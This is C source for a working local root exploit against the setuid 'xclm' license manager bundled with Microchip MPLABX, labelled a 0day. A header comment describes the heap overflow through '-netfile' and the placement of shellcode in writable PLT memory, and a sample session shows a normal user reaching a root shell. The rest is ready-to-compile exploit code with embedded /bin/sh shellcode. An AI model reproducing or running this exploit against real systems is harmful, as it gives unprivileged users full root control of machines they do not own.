/* Microchip XC License Manager: xclm 0day exploit
 * ===============================================
 * The Microchip Technology XC License Manager (XCLM) is 
 * a cross-platform license manager for MPLAB XC C compilers.
 * Multiple vulnerabilties are present inside the "xclm"
 * license manager application distributed with MPLABX 
 * software. The binary is installed setuid root as it 
 * requires USB device access. Improper bounds checks on
 * all user supplied arguments can result in stack and/or
 * heap corruption. The binary is compiled as a 32bit
 * ELF which when run on 64bit systems will map the binary 
 * to a fixed base address of 0x08048000. The bin is compiled
 * with "-fstack-protector" which needs to be bypassed
 * to exploit the stack overflow scenarios. This exploit corrupts 
 * the 512 byte buffers on heap used as arguments to "-netfile". 
 *
 * The first buffer corrupts memory and causes the program
 * to continue so that a heap pointer is eventually used
 * from the second buffer resulting in code execution. The
 * exploit makes use of rwx memory in the PLT to place
 * shellcode, avoiding need for mprotect() or a ROP chain.
 * The binary drops effective uid privileges and requires
 * a call to setresuid32(); on 64bit systems to restore
 * root privileges.
 *
 * Usage.
 *
 * [username@vulnbox tmp]$ id
 * uid=1001(username) gid=1001(username) groups=1001(username)
 * [username@vulnbox tmp]$ uname -a
 * Linux vulnbox 4.18.12-arch1-1-ARCH #1 SMP PREEMPT Thu Oct 4 01:01:27 UTC 2018 x86_64 GNU/Linux
 * [username@vulnbox tmp]$ ls -al /opt/microchip/mplabx/v5.00/mplab_platform/bin/xclm 
 * -rwsr-xr-x 1 root root 2320444 Sep  7 18:39 /opt/microchip/mplabx/v5.00/mplab_platform/bin/xclm
 * [username@vulnbox tmp]$ gcc exploit.c -o exploit
 * [username@vulnbox tmp]$ ./exploit 
 * [ Microchip XC License Manager: xclm <= v2.22 local root exploit
 * sh-4.4# id
 * uid=0(root) gid=1001(username) groups=1001(username)
 * sh-4.4# 
 *
 * -- Hacker Fantastic https://hacker.house
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		 "\x90\x90\x31\xc0\xb0\xd0\x31\xc9\x31\xdb"
		 "\x31\xd2\xcd\x80\x31\xc0\x50\x68//sh\x68"
		 "/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
		 "\xcd\x80";

int main(){
	long ptr;
	int i;
	char *env[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/bin",NULL};
	void *buffer1 = malloc(4096);
	void *buffer2 = malloc(4096);
	if(!buffer1 || !buffer2){
		exit(0);
	}
	char *argp[] = {"/opt/microchip/mplabx/v5.00/mplab_platform/bin/xclm","-netfile",buffer1,buffer2,NULL};
	printf("[ Microchip XC License Manager: xclm <= v2.22 local root exploit\n");
	memset(buffer1,0,4096);
	memset(buffer2,0,4096);
	ptr = (long)buffer1;
	/* heap corruption to PLT needed for $pc */
	for(i = 0;i <= 1000;i++){
		memcpy((void*)ptr,"\x54\xf1\x26\x08",4); 
		ptr+=4;
	}
	/* 2nd variable in heap for code execution */
	ptr = (long)buffer2;
	for(i = 0;i <= 30;i++){
		memcpy((void*)ptr,"\xe8\xf1\x26\x08",4); // $pc
		ptr+=4;
	}
	for(i = 0;i < 4;i++){ // PLT is filled with shellcode 
		memcpy((void*)ptr,shellcode,strlen(shellcode));
		ptr+=4;
	}
	execve("/opt/microchip/mplabx/v5.00/mplab_platform/bin/xclm",argp,env);
}
